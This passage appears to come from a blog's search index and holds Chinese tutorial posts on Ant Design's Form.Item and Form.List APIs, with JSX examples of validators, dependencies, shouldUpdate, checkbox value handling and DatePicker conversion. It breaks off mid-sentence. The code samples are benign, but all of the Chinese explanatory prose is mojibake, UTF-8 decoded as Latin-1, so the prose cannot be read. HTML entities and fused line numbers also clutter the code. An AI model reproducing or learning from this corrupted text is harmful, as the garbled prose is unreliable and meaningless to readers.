æ‰€ä»¥ç¾åœ¨å¦‚æœæˆ‘æƒ³é©—è­‰ã€Œé›»è©±è™Ÿç¢¼æ ¼å¼ã€çš„è©±å°±å¯ä»¥é€™æ¨£å­å¯«ï¼š 1234567891011121314151617181920212223242526272829303132&lt;Form form={form} labelCol={{ span: 24 }} wrapperCol={{ span: 24 }} onFinish={(values) =&gt; { console.log('values', values) }}&gt; &lt;Form.Item name='phone' label='Phone' rules={[ (form) =&gt; { return { validator: (rule, value) =&gt; { const pattern = /^[\\+]?[(]?[0-9]{3}[)]?[-\\s\\.]?[0-9]{3}[-\\s\\.]?[0-9]{4,6}$/ if (pattern.test(value)) { return Promise.resolve() } else { return Promise.reject() } }, message: 'Does not match the phone format.' } } ]} &gt; &lt;Input type='tel' /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; æ­¤è™•ç¯„ä¾‹ï¼šCodeSandbox dependenciesç°¡å–®ä¾†èªªé€™å€‹æ˜¯æ‹¿ä¾†è¨­å®šã€Œç•¶æŸå€‹æ¬„ä½æ›´æ–°æ™‚ï¼Œæˆ‘æƒ³é‡æ–°é©—è­‰ã€çš„ç”¨é€”ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œä¸€èˆ¬å¦‚æœè¦åšã€Œç¢ºèªå¯†ç¢¼ã€çš„æ¬„ä½æ™‚ï¼Œä½ å¯èƒ½æœƒé€™æ¨£å¯«ï¼š 123456789101112131415161718192021222324252627282930313233function App() { return ( &lt;div className='wrapper'&gt; &lt;Form&gt; &lt;Form.Item name='password' label='Password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='confirmPassword' label='Confirm Password' rules={[ (form) =&gt; { return { // onChange æ™‚æœƒé©—è­‰æ˜¯å¦è·ŸåŸå¯†ç¢¼ç›¸åŒ validator: (_, value) =&gt; { if (form.getFieldValue('password') === value) { return Promise.resolve() } else { return Promise.reject('does not match the password.') } } } } ]} &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/div&gt; )}export default App é€™æ¨£å­ç¢ºå¯¦æœƒåœ¨ä¸ç›¸ç­‰æ™‚é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ï¼Œä¸éå¦‚æœæ˜¯ä¸‹é¢é€™ç¨®æƒ…å½¢å‘¢ï¼Ÿ é è¨­çš„è¡Œç‚ºæ˜¯ Confirm Password æ”¹è®Šæ™‚æœƒåšé©—è­‰ï¼Œå¯æ˜¯åœ¨é‚£ä¹‹å¾Œå¦‚æœåˆæ”¹è®Š Password çš„è©±å°±ä¸æœƒè§¸ç™¼é©—è­‰äº†ã€‚ å¦‚æœå¸Œæœ›åœ¨é€™å€‹æ™‚å€™ä¹Ÿåšé©—è­‰çš„è©±ï¼Œå¯ä»¥å° Confirm Password åŠ ä¸Š dependencies ä¾†è™•ç†ï¼š 12345678910111213141516171819202122232425262728293031323334function App() { return ( &lt;div className='wrapper'&gt; &lt;Form&gt; &lt;Form.Item name='password' label='Password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='confirmPassword' label='Confirm Password' dependencies={['password']} // åŠ ä¸Š dependencies rules={[ (form) =&gt; { return { validator: (_, value) =&gt; { console.log('validate') if (form.getFieldValue('password') === value) { return Promise.resolve() } else { return Promise.reject('does not match the password.') } } } } ]} &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/div&gt; )}export default App é€™æ¨£å°±å¯ä»¥é”æˆé æœŸçš„æ•ˆæœäº†ï¼š shouldUpdateå®ƒæ¯”è¼ƒä¸»è¦çš„ç”¨é€”æœ‰å…©å€‹ï¼š å„ªåŒ–æ•ˆèƒ½ï¼ˆä¸éœ€è¦åˆ©ç”¨ state ä¾†é‡æ–°æ¸²æŸ“æ•´å€‹å…ƒä»¶ï¼‰ æŸå€‹å€å¡Šæ˜¯åœ¨ç‰¹å®šæƒ…å¢ƒä¸‹æ‰æœƒç§€å‡ºä¾†çš„ é€™é‚Šä¾†èˆ‰ä¸€å€‹ä¾‹å­ï¼Œå‡è¨­æˆ‘å¸Œæœ›åšå‡ºé€™æ¨£çš„æ•ˆæœï¼š ç°¡å–®ä¾†èªªå°±æ˜¯è¡¨å–®èƒ½æ ¹æ“šæˆ‘ç›®å‰é¸çš„ç”¢å“ä¾†ç§€å‡ºä¸åŒé …ç›®çµ¦ä½¿ç”¨è€…é¸å–ï¼Œå…ˆé™„ä¸Šé€™æ®µçš„åŸå§‹ç¢¼åŠ CodeSandboxï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function App() { const [form] = Form.useForm() const menu = [ { label: 'å¥¶èŒ¶', value: 'å¥¶èŒ¶' }, { label: 'ç‰›è‚‰éºµ', value: 'ç‰›è‚‰éºµ' }, { label: 'é›æ’', value: 'é›æ’' } ] const initValues = { ç”œåº¦: 'ç„¡ç³–', ä»½é‡: 'å°ç¢—', é…¸èœ: 'ä¸è¦', è¾£åº¦: 'å°è¾£', åˆ‡ä¸åˆ‡: 'ä¸è¦' } return ( &lt;div className='wrapper'&gt; &lt;Form form={form} initialValues={initValues} onFinish={(values) =&gt; { console.log(values) }} &gt; &lt;Form.Item name='ç”¢å“' label='ç”¢å“'&gt; &lt;Select options={menu} onChange={() =&gt; form.setFieldsValue({ ...initValues })} /&gt; &lt;/Form.Item&gt; {/* é¸é …å€å¡Š */} &lt;Form.Item shouldUpdate&gt; {/* è‡ªå‹•æ¥æ”¶åˆ° form instance åƒæ•¸ */} {(form) =&gt; { const selectedValue = form.getFieldValue('ç”¢å“') return selectedValue === 'å¥¶èŒ¶' ? ( &lt;Form.Item label='ç”œåº¦' name='ç”œåº¦'&gt; &lt;Radio.Group&gt; &lt;Radio value='ç„¡ç³–'&gt;ç„¡ç³–&lt;/Radio&gt; &lt;Radio value='å°‘ç³–'&gt;å°‘ç³–&lt;/Radio&gt; &lt;Radio value='åŠç³–'&gt;åŠç³–&lt;/Radio&gt; &lt;Radio value='å¤šç³–'&gt;å¤šç³–&lt;/Radio&gt; &lt;Radio value='å…¨ç³–'&gt;å…¨ç³–&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; ) : selectedValue === 'ç‰›è‚‰éºµ' ? ( &lt;&gt; &lt;Form.Item label='ä»½é‡' name='ä»½é‡'&gt; &lt;Radio.Group&gt; &lt;Radio value='å°ç¢—'&gt;å°ç¢—&lt;/Radio&gt; &lt;Radio value='å¤§ç¢—'&gt;å¤§ç¢—&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;Form.Item label='é…¸èœ' name='é…¸èœ'&gt; &lt;Radio.Group&gt; &lt;Radio value='ä¸è¦'&gt;ä¸è¦&lt;/Radio&gt; &lt;Radio value='è¦'&gt;è¦&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/&gt; ) : selectedValue === 'é›æ’' ? ( &lt;&gt; &lt;Form.Item label='è¾£åº¦' name='è¾£åº¦'&gt; &lt;Radio.Group&gt; &lt;Radio value='ä¸è¾£'&gt;ä¸è¾£&lt;/Radio&gt; &lt;Radio value='å°è¾£'&gt;å°è¾£&lt;/Radio&gt; &lt;Radio value='å¤§è¾£'&gt;å¤§è¾£&lt;/Radio&gt; &lt;Radio value='ä¸­è¾£'&gt;ä¸­è¾£&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;Form.Item label='åˆ‡ä¸åˆ‡' name='åˆ‡ä¸åˆ‡'&gt; &lt;Radio.Group&gt; &lt;Radio value='ä¸è¦'&gt;ä¸è¦&lt;/Radio&gt; &lt;Radio value='è¦'&gt;è¦&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/&gt; ) : null }} &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;é€å‡º&lt;/Button&gt; &lt;/Form&gt; &lt;/div&gt; )}export default App é€™æ¨£å­åšçš„å¥½è™•æ˜¯ä¸æœƒæŠŠæ•´å€‹å…ƒä»¶é‡æ–°æ¸²æŸ“ï¼ŒAntd æœƒè‡ªå‹•å¹«ä½ é‡æ–°æ¸²æŸ“ã€Œé€™å€‹å€å¡Šã€ï¼Œæƒ³é©—è­‰çš„è©±å¯ä»¥åŠ ä¸Š useEffect è·‘è·‘çœ‹ï¼š 123456789useEffect(() =&gt; { console.log('render') const timer = setInterval(() =&gt; { setCounter(counter + 1) }, 1000) return () =&gt; { clearInterval(timer) }}) ï¼ˆåªæœ‰æ›´æ–° counter æ™‚æ‰æœƒè®“å…ƒä»¶é‡æ–°æ¸²æŸ“ï¼‰ å†ä¾†é»å„ªåŒ–é›–ç„¶ shouldUpdate åªæœƒé‡æ–°æ¸²æŸ“æŒ‡å®šå€å¡Šï¼Œä½†æœ‰å¦å¤–ä¸€å€‹å•é¡Œæ˜¯ã€Œæ¯ä¸€æ¬¡ form çš„ä»»ä½•è³‡æ–™æ”¹è®Šæ™‚éƒ½æœƒé‡æ–°æ¸²æŸ“ã€ï¼Œå› ç‚ºé€™æ˜¯é è¨­è¡Œç‚ºã€‚ å‡è¨­ç¾åœ¨åŠ ä¸Šä¸€å€‹è³¼è²·äººçš„æ¬„ä½ï¼Œç„¶å¾Œåœ¨ shouldUpdate åŠ ä¸Š logï¼Œå°±æœƒç™¼ç¾æ¯æ¬¡æˆ‘å€‘æ¯æ¬¡è¼¸å…¥æ™‚éƒ½æœƒè§¸ç™¼ shouldUpdate çš„é‡æ–°æ¸²æŸ“ï¼ˆæˆ–æ˜¯ä»»ä½•æ¬„ä½å€¼æ”¹è®Šï¼‰ï¼š ä»¥é€™å€‹ç¯„ä¾‹ä¾†èªªæˆ‘å€‘æ‡‰è©²åªéœ€è¦åœ¨ã€Œç”¢å“ã€æ”¹è®Šæ™‚å»é‡æ–°æ¸²æŸ“ã€Œé¸é …ã€çš„å€å¡Šå°±å¥½ï¼Œä¸éœ€è¦æ¯ä¸€æ¬¡éƒ½åšæ›´æ–°ï¼Œæ‰€ä»¥å¯ä»¥æ”¹å¯«æˆé€™ç¨®å½¢å¼ï¼š 1234567&lt;Form.Item shouldUpdate={(prevValues, currentValues) =&gt; { return prevValues['ç”¢å“'] !== currentValues['ç”¢å“'] }}&gt; {/* ... */}&lt;/Form.Item&gt; shouldUpdate å¯ä»¥å‚³å…¥ä¸€å€‹ function ä¸¦æ¥æ”¶åˆ°ã€ŒèˆŠ / æ–°ã€çš„å€¼ï¼Œæ¥è‘—åˆ©ç”¨é€™å€‹ä¾†åˆ¤æ–·ã€Œç”¢å“ã€æœ‰æ²’æœ‰è¢«æ”¹è®Šå³å¯ï¼Œç•¶ç”¢å“ä¸€æ¨£æ™‚æœƒå›å‚³ falseï¼Œä¸æœƒè§¸ç™¼æ›´æ–°ï¼Œè€Œç•¶ç”¢å“ä¸ä¸€æ¨£æ™‚å‰‡å›å‚³ trueï¼Œæ‰€ä»¥è§¸ç™¼æ›´æ–°ã€‚ é€™æ¨£å­å°±èƒ½ç¢ºä¿åªæœ‰åœ¨ç”¢å“æ”¹è®Šæ™‚æ‰å»æ›´æ–°é¸é …çš„æ¬„ä½äº†ï¼š æ­é… CheckBox ä½¿ç”¨ç•¶æ­é… &lt;Form.Item&gt; ä¾†ä½¿ç”¨ checkbox æ™‚ï¼Œä½ å¯èƒ½æ²’è¾¦æ³•åœ¨ onFinish æ™‚å–å‡ºæ­£ç¢ºçš„å€¼ï¼š 1234567891011121314const App = () =&gt; { return ( &lt;Form onFinish={(values) =&gt; { console.log(values) // }} &gt; &lt;Form.Item name='isJunior'&gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} ä¸ç®¡æˆ‘æœ‰æ²’æœ‰å‹¾é¸ï¼Œæœ€å¾Œçš„çµæœéƒ½æœƒæ˜¯ { isJunior: undefined }ã€‚ è§£æ±ºæ–¹å¼æ˜¯åœ¨ Form.Item ä¸Šæ–°å¢ valuePropName='checked'ï¼š 1234567891011121314const App = () =&gt; { return ( &lt;Form onFinish={(values) =&gt; { console.log(values) }} &gt; &lt;Form.Item name='isJunior' valuePropName='checked'&gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} é€™æ¨£å°±å¯ä»¥æ­£ç¢ºçš„å–å‡º { isJunior: true } æˆ– { isJunior: false }ã€‚ èƒŒå¾Œçš„åŸç†å…¶å¯¦æ˜¯ç”¨ getValueProps å’Œ getValueFromEvent ä¾†å¯¦ä½œçš„ï¼Œä¸æ‡‚çš„è©±å»ºè­°å…ˆçœ‹æ»‘å»ä¸‹é¢ç†è§£ä¸€ä¸‹é€™å…©å€‹çš„ç”¨æ³•å†æ‹‰å›ä¾†çœ‹ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨ getValueProps è¨­å®šè¡¨å–®å…ƒä»¶çš„ value å±¬æ€§ï¼Œæ¥è‘—å†ç”¨ getValueFromEventä¾†è™•ç†ç•¶å€¼æ”¹è®Šæ™‚è©²ã€Œå¦‚ä½•å°å€¼åšè½‰æ›ã€ï¼Œç›´æ¥ä¾†çœ‹ç¯„ä¾‹ï¼š 1234567891011121314151617181920&lt;Form onFinish={(values) =&gt; console.log(values)} initialValues={{ isJunior: true }}&gt; &lt;Form.Item name='isJunior' getValueFromEvent={(event) =&gt; { // onChange æ™‚æŠŠ checked çš„å€¼å–å‡ºä¸¦å›å‚³ // é€™è£¡å›å‚³çš„æ±è¥¿å°±æœƒè®Šæˆ getValueProps ä¸­çš„ value return event.target.checked }} getValueProps={(value) =&gt; { // å›å‚³ \"checked\" èˆ‡ \"value\" çš„ç‰©ä»¶ return { checked: value, value } }} &gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; é™„è¨»ï¼šCodeSandbox é€™å°±è·Ÿä½ è‡ªå·±åœ¨å¯«ã€ŒControlled Componentã€çš„æ™‚å€™æœ‰é»é¡ä¼¼ï¼š 1234567891011121314function App() { const [isJunior, setIsJunior] = useState(false) return ( &lt;label&gt; isJunior &lt;input type='checkbox' checked={isJunior} onChange={(event) =&gt; setIsJunior(event.target.checked)} /&gt; &lt;/label&gt; )} åªä¸éå› ç‚ºé€™é‚Šçš„ &lt;Chekbox&gt; æ˜¯æ”¾åœ¨ &lt;Form.Item&gt; è£¡ï¼Œæ‰€ä»¥ä¾ç…§ Antd çš„è¦å‰‡ä¾†èªª &lt;Form.Item&gt; ä¸­çš„å…ƒä»¶å¿…é ˆç”¨ value ä¾†æ§åˆ¶ï¼Œè€Œä¸æ˜¯ checkedã€‚ ä¸éæ—¢ä½¿æ˜¯é€é value ä¾†æ§åˆ¶ï¼Œä½ ä¸€æ¨£å¾—å‚³ checked å±¬æ€§çµ¦ &lt;Checkbox&gt;ï¼Œå› ç‚ºä»–æœ¬èº«é‚„æ˜¯å¾—æœ‰é€™å€‹å±¬æ€§ï¼Œå¦å‰‡å¯èƒ½æœƒçœ‹åˆ°é€™æ®µ warningï¼š ç¸½ä¹‹é€™èƒŒå¾Œå°±æ˜¯å°å€¼åšè½‰æ›è€Œå·²ï¼ŒçŸ¥é“åŸç†ä»¥å¾Œä½ ç”šè‡³èƒ½é€™æ¨£å­ç©ï¼š 1234567891011121314151617181920212223242526272829303132const App = () =&gt; { return ( &lt;Form onFinish={(values) =&gt; { // {isJunior: \"Y\"} or {isJunior: \"N\"} console.log(values) }} initialValues={{ // ç”¨è‡ªå®šç¾©çš„å€¼ä¾†è¡¨ç¤º isJunior: 'Y' }} &gt; &lt;Form.Item name='isJunior' getValueFromEvent={(event) =&gt; { // æŠŠå€¼å¾ true / false è½‰æ›æˆè‡ªå®šç¾©çš„å€¼ return event.target.checked ? 'Y' : 'N' }} getValueProps={(value) =&gt; { // æŠŠè‡ªå®šç¾©çš„å€¼ä¾†è½‰æ›æˆå…ƒä»¶çœ‹å¾—æ‡‚çš„å€¼ï¼ˆtrue /falseï¼‰ return { checked: value === 'Y', value: value === 'Y' } }} &gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} é™„è¨»ï¼šCodeSandbox é€™æ¨£å­çš„å¥½è™•æ˜¯ä½ å¯ä»¥åœ¨æŒ‰ä¸‹ã€ŒSubmitã€æ™‚å°±ç›´æ¥æ‹¿åˆ°ä½ æƒ³è¦çš„å€¼ Y / Nï¼Œä¸ç”¨å†è‡ªå·±å° true / false ä¾†åšè½‰æ›ï¼Œå› ç‚ºä½ åœ¨ &lt;Form.Item&gt; é‚£ä¸€å±¤å°±å…ˆåšå¥½è½‰æ›çš„å‹•ä½œäº†ã€‚ getValueProps &amp; getValueFromEventgetValuePropsç°¡å–®ä¾†èªª getValueProps æ˜¯ç”¨ä¾†è®“ä½ é‡æ–°è¨­å®š value å±¬æ€§çš„å€¼ï¼ˆä¹Ÿè¨±å¯ä»¥è¨­å®šåˆ¥çš„å±¬æ€§ï¼Œä½†æˆ‘æƒ³æ¬¡æ•¸çœŸçš„ä¸å¤šï¼‰ã€‚ å¯¦éš›å¯ä»¥ç”¨åœ¨ &lt;Form.Item&gt; åº•ä¸‹çš„ &lt;DatePicker&gt;ï¼š 123456789101112131415161718192021const App = () =&gt; { return ( &lt;Form initialValues={{ date: '08/08/2022' }}&gt; &lt;Form.Item label='date' name='date' getValueProps={(value) =&gt; { // 08/08/2022 console.log('value', value) // æ ¹æ“šåˆå§‹å€¼è¨­å®šç‚ºç©ºå­—ä¸² or æ–°çš„ moment ç‰©ä»¶ return { value: moment(value, 'DD/MM/YYYY', true).isValid() ? moment(value, 'DD/MM/YYYY') : '' } }} &gt; &lt;DatePicker /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} æœƒé€™æ¨£è¨­å®šæ˜¯å› ç‚º &lt;Form.Item&gt; é è¨­æœƒè‡ªå‹•å¹«åº•ä¸‹çš„è¡¨å–®å…ƒä»¶è¨­å®š value å€¼ï¼Œå®˜æ–¹æ–‡ä»¶æœ‰æåˆ°é€™é»ï¼š è¢«è®¾ç½®äº† name å±æ€§çš„ Form.Item åŒ…è£…çš„æ§ä»¶ï¼Œè¡¨å•æ§ä»¶ä¼šè‡ªåŠ¨æ·»åŠ  valueï¼ˆæˆ– valuePropName æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ onChangeï¼ˆæˆ– trigger æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ å¯ä»¥æƒ³æˆå®ƒæœƒè‡ªå‹•å¹« &lt;DatePicker&gt; åŠ ä¸Š value å’Œ onChange äº‹ä»¶ï¼Œåƒé€™æ¨£å­ï¼š&lt;DatePicker value=\"08/08/2022\"/&gt; ä½†é€™æ¨£å­æœƒæœ‰å•é¡Œï¼Œå› ç‚º &lt;DatePicker&gt; æ˜¯é€é moment æ ¼å¼çš„ç‰©ä»¶ä¾†é‹ä½œçš„ï¼Œä»£è¡¨ value å¿…é ˆæ˜¯ä¸€å€‹ moment ç‰©ä»¶ï¼Œå¦å‰‡çš„è©±æœƒç›´æ¥å£æ‰ï¼ˆå¯èƒ½æœƒçœ‹åˆ° date.clone is not a function çš„éŒ¯èª¤ï¼‰ ç¸½è€Œè¨€ä¹‹é€é getValueProps æˆ‘å€‘å°±èƒ½åœ¨é€™ä¸€å±¤å…ˆå° value åšè™•ç†ï¼Œçœ‹æ˜¯è¦æŠŠå®ƒè½‰æ›æˆç©ºå­—ä¸²ï¼ˆé€™æ˜¯åˆæ³•çš„å€¼ï¼‰ é‚„æ˜¯ moment ç‰©ä»¶ï¼Œæ¥è‘—å‚³çµ¦ &lt;DatePicker&gt;ï¼Œå°±èƒ½é¿å…æ ¼å¼ä¸Šçš„å•é¡Œã€‚ getValueFromEventå‰›å‰›çš„ç¯„ä¾‹å…¶å¯¦æœƒæœ‰å¦å¤–ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯ç•¶æˆ‘ã€Œé‡æ–°é¸äº†ä¸€å€‹æ—¥æœŸã€æ™‚ï¼Œæ‹¿åˆ°çš„ value æœƒè®Šæˆ moment ç‰©ä»¶è€Œä¸æ˜¯åŸæœ¬çš„ 08/08/2022ï¼š é€™é‚Šæœƒæœ‰å…©å€‹å•é¡Œï¼š 1. åŸºæ–¼æˆ‘å€‘ä¸€é–‹å§‹å¯«çš„åˆ¤æ–·å¯èƒ½æœƒç”¢ç”Ÿéé æœŸçµæœ 1234567891011121314&lt;Form.Item label=\"date\" name=\"date\" getValueProps={(value) =&gt; { // å¦‚æœæ‹¿åˆ° moment ç‰©ä»¶ console.log('value', value) // ç­‰æ–¼åˆæŠŠ moment ä¸Ÿé€²å» moment() ç•¶ä½œå€¼ return { value: moment(value, \"DD/MM/YYYY\", true).isValid() ? moment(value, \"DD/MM/YYYY\") : \"\" }; }}&gt; 2. è¡¨å–® Submit å¾Œæ‹¿åˆ°çš„æ˜¯ moment ç‰©ä»¶è€Œä¸æ˜¯ 08/08/2022 è¦è§£æ±ºé€™å€‹å•é¡Œçš„è¾¦æ³•å°±æ˜¯ getValueFromEventã€‚ äººå¦‚å…¶åï¼Œå®ƒçš„ç”¨é€”å°±æ˜¯ã€Œåœ¨ onChange æ™‚æŠŠ event ä¸Ÿçµ¦ä½ ï¼Œè®“ä½ é‡æ–°è¨­å®š value çš„å€¼æ‡‰è©²è¦é•·æ€æ¨£ï¼Ÿã€ã€‚ä¹Ÿè¨±è¡¨é”çš„ä¸æ˜¯å¾ˆæ­£ç¢ºï¼Œä½†æˆ‘è¦ºå¾—é€™æ¨£å­æ¯”è¼ƒå¥½ç†è§£å°±æ˜¯äº†ã€‚ é™„è¨»ï¼šå°æ–¼ DatePicker ä¾†èªª getValueFromEvent æœƒæ‹¿åˆ°çš„æ˜¯ momentï¼Œä½†ä¸€èˆ¬çš„ &lt;Input&gt; æˆ–æ˜¯ &lt;Checkbox&gt; é€™é¡çš„è¡¨å–®å…ƒä»¶å‰‡æœƒæ‹¿åˆ° event ç‰©ä»¶ã€‚ æ‰€ä»¥ä¸Šé¢çš„ç¯„ä¾‹å¯ä»¥æ”¹å¯«æˆé€™æ¨£ï¼š 12345678910111213141516&lt;Form.Item label='date' name='date' getValueFromEvent={(moment) =&gt; { // é€™è£¡å›å‚³ä»€éº¼ï¼Œä¸‹é¢çš„ value å°±æœƒæ‹¿åˆ°ä»€éº¼ // æ‰€ä»¥ä¸éœ€è¦å¯«æˆ `{ value: ... }` çš„å½¢å¼ return moment.format('DD/MM/YYYY') }} getValueProps={(value) =&gt; { return { value: moment(value, 'DD/MM/YYYY', true).isValid() ? moment(value, 'DD/MM/YYYY') : '' } }}&gt; &lt;DatePicker /&gt;&lt;/Form.Item&gt; é™„è¨»ï¼šCodeSandBox é€£çµ æ‰€ä»¥é€™å…©å€‹æ±è¥¿æ­é…ä½¿ç”¨çš„è©±å°±å¯ä»¥è§£æ±º &lt;DatePicker&gt; çš„æ ¼å¼å•é¡Œå›‰ã€‚","link":"/2022/09/24/antd-form-item/"},{"title":"Ant Designï¼Form.List","text":"ä¾†é‚„å‚µå›‰ã€‚ ç°¡è¿°é€™å€‹æ˜¯åœ¨è™•ç†è¡¨å–®æ™‚æˆ‘è¦ºå¾—æ¯”è¼ƒéº»ç…©çš„ä¸€å€‹éƒ¨åˆ†ï¼Œå†åŠ ä¸Šå®˜æ–¹ç¯„ä¾‹ç‚ºäº†å±•ç¾æ‰€æœ‰åŠŸèƒ½æ‰€ä»¥å¯«åˆæ›´è¤‡é›œäº†ä¸€äº›ï¼Œç¸½ä¹‹æˆ‘è¦ºå¾—æ²’æœ‰éº¼å¥½æ‡‚ï¼Œæ‰€ä»¥å¯«ä¸€ç¯‡ç­†è¨˜ä¾†è¨˜éŒ„ä¸€ä¸‹ã€‚ ç¯„ä¾‹ç°¡å–®ä¾†èªªï¼Œå‡è¨­æˆ‘æœ‰ä¸€å€‹è¡¨å–®ï¼Œæˆ‘å¸Œæœ›ä»–é€å‡ºå»æ™‚çš„è³‡æ–™æ˜¯é•·é€™æ¨£ï¼š 12345678910const classRoom = { number: '1A', teacher: 'PeaNu', department: 'CS', students: [ { name: 'PPB', phone: '0912345678' }, { name: 'JoJo', phone: '0912345678' }, { name: 'Dio', phone: '0912345678' } ]} é€™æ™‚å€™ç¬¬ä¸€å€‹æœƒç¢°åˆ°çš„å•é¡Œæ˜¯ï¼šæˆ‘è¦æ€éº¼ç”¢ç”Ÿ students çš„æ¬„ä½ï¼Ÿç•¢ç«Ÿæˆ‘ä¸å¯èƒ½é€™æ¨£å¯«ï¼š 12345678&lt;Form.Item label='Students' name='students'&gt; &lt;Form.Item label='Name' name='name'&gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Phone' name='phone'&gt; &lt;Input /&gt; &lt;/Form.Item&gt;&lt;/Form.Item&gt; é€™æ¨£å­åœ¨æäº¤è¡¨å–®çš„æ™‚å€™åªæœƒè¢«ç•¶æˆæ˜¯æ–°çš„æ¬„ä½ï¼Œåƒé€™æ¨£ï¼š é™„è¨»ï¼šæ³¨æ„å¤šäº† name è·Ÿ phone é€™å…©å€‹æ¬„ä½ å¦‚æœé‚„æ˜¯ä¸å¤ªæ¸…æ¥šçš„è©±å¯ä»¥åˆ°é€™é‚Šçœ‹å¯¦éš›ç¯„ä¾‹ã€‚ ç¸½ä¹‹å‘¢ï¼Œé€™é‚Šè¦ç”¨ antd æä¾›çš„ Form.List ä¾†åšï¼Œå…ˆä¾†çœ‹å¯«æ³•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;Form form={form} initialValues={initRequest} onFinish={onFinish}&gt; {/* ...ç•¥ */} &lt;Form.List name='students'&gt; {(fields, operation) =&gt; { return ( &lt;&gt; {/* åˆ—è¡¨æ¬„ä½ */} {fields.map((field) =&gt; { return ( &lt;React.Fragment key={field.key}&gt; &lt;Divider plain&gt;Students&lt;/Divider&gt; &lt;Form.Item label='Name' name={[field.name, 'name']}&gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Phone' name={[field.name, 'phone']}&gt; &lt;Input /&gt; &lt;/Form.Item&gt; {/* åˆªé™¤æŒ‰éˆ• */} &lt;Form.Item&gt; &lt;Button type='primary' danger onClick={() =&gt; operation.remove(field.name)}&gt; Delete &lt;/Button&gt; &lt;/Form.Item&gt; &lt;/React.Fragment&gt; ) })} {/* æ–°å¢æŒ‰éˆ• */} &lt;Form.Item&gt; &lt;Button onClick={() =&gt; operation.add()}&gt; &lt;PlusOutlined /&gt; &lt;/Button&gt; &lt;/Form.Item&gt; &lt;/&gt; ) }} &lt;/Form.List&gt; &lt;Form.Item style={{ textAlign: 'center' }}&gt; &lt;Button type='primary' htmlType='submit'&gt; Submit &lt;/Button&gt; &lt;/Form.Item&gt;&lt;/Form&gt; é™„è¨»ï¼š name è£¡é¢çš„é™£åˆ—é †åºä¸€å®šè¦æ˜¯ [field.name, \"phone\"] é€™æ¨£çš„é †åºï¼Œå¦å‰‡æœƒæœ‰å•é¡Œã€‚ï¼ˆé‡è¦ï¼ï¼ï¼ï¼‰ ä¸è¦æŠŠ onClick={() =&gt; operation.add()} å¯«æˆ onClick={operation.add}ã€‚é›–ç„¶é€™æ¨£å¯ä»¥åŸ·è¡Œï¼Œä½†æœƒæœ‰ä¸€äº›é¡å¤–çš„å•é¡Œã€‚ ç•¶åˆæˆ‘çœ‹åˆ°é€™è£¡ä¹Ÿè¦ºå¾—å¾ˆäº‚ï¼Œä¸éåªè¦ä¸€æ­¥ä¸€æ­¥ä¾†çœ‹å°±å¥½ã€‚ é¦–å…ˆ Form.List çš„å…§å®¹æ˜¯ä¸€å€‹ functionï¼Œä»–çš„å…§å®¹æœƒé•·é€™æ¨£ï¼š 12345678910// function ä¸­çš„åƒæ•¸const renderChild = ( fields: Field[], operation: { add, remove, move, }, meta: { errors }) =&gt; React.ReactNode ç°¡å–®ä¾†èªªå°±æ˜¯ç”¨å®ƒæä¾›çµ¦ä½ çš„ã€Œé€™å€‹ functionã€ä¾†ç”¢ç”Ÿå…§å®¹ï¼Œè‡³æ–¼åƒæ•¸çš„éƒ¨åˆ†æˆ‘æœƒä¸€å€‹ä¸€å€‹è§£é‡‹ã€‚ fieldsé€™æ˜¯ç”¨ä¾†ä»£è¡¨åˆ—è¡¨ä¸­çš„æ¯å€‹æ¬„ä½ï¼Œä¸éå®ƒçš„å€¼å¯èƒ½è·Ÿä½ æƒ³å¾—ä¸å¤ªä¸€æ¨£ï¼ŒæŠŠå®ƒå°å‡ºä¾†çš„çµæœæ˜¯ï¼š ä¹‹æ‰€ä»¥æœƒé€™æ¨£å­æ˜¯å› ç‚ºç•¶æˆ‘å€‘è¦æ¸²æŸ“ students æ™‚ï¼Œæˆ‘å€‘æœƒæœ‰å¤šå€‹ç›¸åŒçš„æ¬„ä½ï¼Œåƒæ˜¯æ¯å€‹ student éƒ½æœƒæœ‰ name å’Œ phoneï¼Œé€™æ™‚å€™å¦‚æœ fields ä¹Ÿç”¨åŒæ¨£çš„åç¨±çš„è©±æœƒã€Œæ’åã€ï¼Œæ‰€ä»¥é€™é‚Šæ‰æœƒè‡ªå‹•ç”¢ç”Ÿå¾ 